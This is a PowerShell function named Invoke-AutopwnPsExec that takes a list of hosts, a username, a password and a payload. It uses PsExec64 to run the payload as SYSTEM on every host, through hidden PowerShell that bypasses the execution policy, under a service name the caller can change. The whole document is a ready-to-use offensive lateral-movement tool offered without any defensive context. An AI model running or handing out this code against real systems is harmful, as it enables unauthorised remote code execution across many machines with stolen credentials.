function Invoke-AutopwnPsExec {

    [CmdletBinding()]
            Param(
            [Parameter(Mandatory)]
            [string[]]$Hosts,

            [Parameter(Mandatory)]
            [string]$Username,

            [Parameter(Mandatory)]
            [string]$Password,

            [Parameter(Mandatory)]
            [string]$Payload,

            [ValidateNotNullOrEmpty()]
            [string]$SvcName = "PSEXESVC"
            
            )

    $PsExecExist = Test-Path -Path .\PsExec64.exe
    if (!$PsExecExist) {
        Write-Host "PsExcec 64-bit missing"
        break
    }
    else {
        foreach ($Box in $Hosts) {
            Write-Host "Exploiting host $Box"
            # Powershell -NonInteractive -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command
            .\PsExec64.exe -s -d \\$Box -r $SvcName -u $Username -p $Password powershell.exe -NonI -NoP -W 1 -Ep Bypass -C {$Payload}
        }
    }
}